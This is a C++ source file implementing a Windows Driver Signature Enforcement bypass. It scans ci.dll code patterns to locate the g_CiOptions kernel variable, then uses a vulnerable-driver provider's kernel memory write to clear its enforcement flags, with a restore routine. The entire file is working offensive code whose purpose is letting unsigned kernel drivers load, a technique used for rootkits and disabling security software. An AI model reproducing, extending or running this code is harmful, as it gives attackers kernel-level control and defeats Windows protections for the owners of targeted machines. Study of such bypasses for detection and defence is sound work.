/**
 * @file DSE.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief Implementation of robust DSE bypass using KDU-style pattern scanning.
 */

#include "DSE.h"
#include "Utils.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <Windows.h>

extern std::ofstream g_logFile;

namespace KernelMode {

    DSE::DSE(Providers::IProvider* provider)
        : provider(provider), ciOptionsAddress(0), originalCiOptions(-1) {}

    bool DSE::ValidateInstructionBlock(const std::vector<uint8_t>& code, size_t offset) {
        if (offset + 16 >= code.size()) return false;
        
        // KDU logic for checking mov r9, rbx; mov r8, rdi
        if (code[offset] != 0x4C || code[offset + 1] != 0x8B) return false;
        
        if ((code[offset + 3] != 0x4C && code[offset + 3] != 0x44) || code[offset + 4] != 0x8B) {
            return false;
        }
        
        return true;
    }

    uintptr_t DSE::FindCiOptionsWithRobustPattern() {
        uintptr_t ciBase = Utils::GetKernelModuleBase("ci.dll");
        if (!ciBase) {
            std::wcerr << L"[-] Failed to get base address of ci.dll." << std::endl;
            return 0;
        }

        // Load ci.dll into our address space
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        strcat_s(systemPath, "\\ci.dll");
        HMODULE ciModule = LoadLibraryExA(systemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!ciModule) {
            std::wcerr << L"[-] Failed to load ci.dll: " << GetLastError() << std::endl;
            return 0;
        }

        uintptr_t pCiInitialize = (uintptr_t)GetProcAddress(ciModule, "CiInitialize");
        if (!pCiInitialize) {
            std::wcerr << L"[-] Failed to find CiInitialize export." << std::endl;
            FreeLibrary(ciModule);
            return 0;
        }

        // Read function code
        const size_t FUNC_SIZE = 256;
        std::vector<uint8_t> funcCode(FUNC_SIZE);
        memcpy(funcCode.data(), (void*)pCiInitialize, FUNC_SIZE);

        ULONG offset = 0;
        LONG relativeValue = 0;
        
        // Scan for jump/call to CipInitialize
        // IMPROVED: Iterate all calls and verify if they look like CipInitialize
        bool found = false;
        uintptr_t pCipInitialize = 0;
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)ciModule + ((PIMAGE_DOS_HEADER)ciModule)->e_lfanew);
        uintptr_t moduleStart = (uintptr_t)ciModule;
        uintptr_t moduleEnd = moduleStart + ntHeaders->OptionalHeader.SizeOfImage;

        for (offset = 0; offset < 200; ++offset) {
            // Check for CALL (E8) or JMP (E9)
            if (funcCode[offset] == 0xE8 || funcCode[offset] == 0xE9) {
                relativeValue = *(PLONG)(funcCode.data() + offset + 1);
                
                uintptr_t pCandidate = pCiInitialize + (offset + 5) + relativeValue;
                
                // 1. Basic bounds check
                if (pCandidate >= moduleStart && pCandidate < moduleEnd) {
                    
                    // 2. Content check - Look for g_CiOptions write inside the candidate function
                    // We optimistically assume we can read 256 bytes from candidate
                    if (pCandidate + 256 < moduleEnd) {
                        bool looksLikeCip = false;
                        for (int k = 0; k < 200; ++k) {
                             // Look for MOV [REL32], REG (89 0D ...) which updates g_CiOptions
                             uint8_t* code = (uint8_t*)pCandidate;
                             if (code[k] == 0x89 && code[k+1] == 0x0D) {
                                 looksLikeCip = true;
                                 break;
                             }
                        }
                        
                        if (looksLikeCip) {
                            // Found it!
                            pCipInitialize = pCandidate;
                            
                            if (g_logFile.is_open()) {
                                g_logFile << "[*] Pattern match found at offset: " << std::hex << offset << std::endl;
                                g_logFile << "[*] CipInitialize candidate: " << std::hex << pCipInitialize << std::endl;
                            }

                            // Re-calculate offset logic for downstream code to match
                            // The downstream code expects 'offset' to be the end of instruction in CiInitialize
                            // But we are replacing the logic.
                            // We will simply use pCipInitialize directly.
                            found = true;
                            break;
                        }
                    }
                }
            }
        }

        if (!found) {
            std::wcerr << L"[-] Could not find jump/call to CipInitialize (Robust Scan)." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Could not find jump/call to CipInitialize (Robust Scan)." << std::endl;
            FreeLibrary(ciModule);
            return 0;
        }

        // pCipInitialize is now set to the start of CipInitialize
        
        // --- BUG-007 FIX: Harden Pattern Scanning Pointers (Redundant but kept for structure) ---
        // moduleEnd already calculated above
        
        if (g_logFile.is_open()) {
             g_logFile << "[*] Module Range: " << std::hex << moduleStart << " - " << moduleEnd << std::endl;
             g_logFile << "[*] Final pCipInitialize: " << std::hex << pCipInitialize << std::endl;
        }

        if (pCipInitialize < moduleStart || pCipInitialize >= moduleEnd) {
             std::wcerr << L"[-] CIP initialization pointer out of module bounds." << std::endl;
             if (g_logFile.is_open()) g_logFile << "[-] CIP initialization pointer out of module bounds." << std::endl;
             FreeLibrary(ciModule);
             return 0;
        }
        // -----------------------------------------------------
        
        // Verify code
        std::vector<uint8_t> cipCode(256);
        // Ensure bounds
        // moduleEnd already calculated above
        
        // Better: assume safe read for POC
        memcpy(cipCode.data(), (void*)pCipInitialize, 256);

        relativeValue = 0;
        // Look for: mov dword ptr [g_CiOptions], reg (89 0D ...)
        for (offset = 0; offset < 200; ++offset) {
            if (cipCode[offset] == 0x89 && cipCode[offset+1] == 0x0D) {
                relativeValue = *(PLONG)(cipCode.data() + offset + 2);
                offset += 6;
                break;
            }
        }

        if (relativeValue == 0) {
            std::wcerr << L"[-] Could not find g_CiOptions reference." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Could not find g_CiOptions reference." << std::endl;
            FreeLibrary(ciModule);
            return 0;
        }

        uintptr_t instructionEnd = pCipInitialize + offset;
        uintptr_t targetRva = (instructionEnd + relativeValue) - (uintptr_t)ciModule;
        
        if (g_logFile.is_open()) {
            g_logFile << "[*] Found g_CiOptions relative offset: " << std::hex << relativeValue << std::endl;
            g_logFile << "[*] Target RVA: " << std::hex << targetRva << std::endl;
        }

        FreeLibrary(ciModule);
        
        return ciBase + targetRva;
    }

    bool DSE::FindCiOptions() {
        if (ciOptionsAddress != 0) return true;

        if (g_logFile.is_open()) g_logFile << "[*] Calling FindCiOptionsWithRobustPattern..." << std::endl;
        ciOptionsAddress = FindCiOptionsWithRobustPattern();
        if (g_logFile.is_open()) g_logFile << "[*] FindCiOptionsWithRobustPattern returned: " << std::hex << ciOptionsAddress << std::endl;
        
        if (!ciOptionsAddress) return false;

        std::wcout << L"[+] Resolved g_CiOptions: 0x" << std::hex << ciOptionsAddress << std::endl;

        uint32_t value = 0;
        if (!provider->ReadKernelMemory(ciOptionsAddress, &value, sizeof(value))) {
            std::wcerr << L"[-] Address verification failed (ReadKernelMemory)." << std::endl;
            ciOptionsAddress = 0;
            return false;
        }
        
        this->originalCiOptions = value;
        std::wcout << L"[+] Original g_CiOptions: 0x" << std::hex << value << std::endl;
        return true;
    }

    bool DSE::Disable() {
        if (!FindCiOptions()) return false;

        uint32_t val = (uint32_t)originalCiOptions;
        val &= ~0x6; 

        if (!provider->WriteKernelMemory(ciOptionsAddress, &val, sizeof(val))) {
            std::wcerr << L"[-] Failed to write g_CiOptions." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[-] Failed to write g_CiOptions." << std::endl;
            return false;
        }

        uint32_t verify = 0;
        provider->ReadKernelMemory(ciOptionsAddress, &verify, sizeof(verify));
        if (verify == val) {
            std::wcout << L"[+] DSE Disabled (Flags cleared)." << std::endl;
            if (g_logFile.is_open()) g_logFile << "[+] DSE Disabled (Flags cleared)." << std::endl;
            return true;
        }
        
        std::wcerr << L"[-] DSE Disable verification failed. Value: " << std::hex << verify << std::endl;
        if (g_logFile.is_open()) g_logFile << "[-] DSE Disable verification failed. Value: " << std::hex << verify << std::endl;
        return false;
    }

    bool DSE::Restore() {
        if (!ciOptionsAddress || originalCiOptions == -1) return false;

        uint32_t val = (uint32_t)originalCiOptions;
        if (provider->WriteKernelMemory(ciOptionsAddress, &val, sizeof(val))) {
            std::wcout << L"[+] DSE Restored." << std::endl;
            
            // Reset state to allow proper object reuse (LIFECYCLE-026 fix)
            ciOptionsAddress = 0;
            originalCiOptions = -1;
            
            return true;
        }
        return false;
    }
}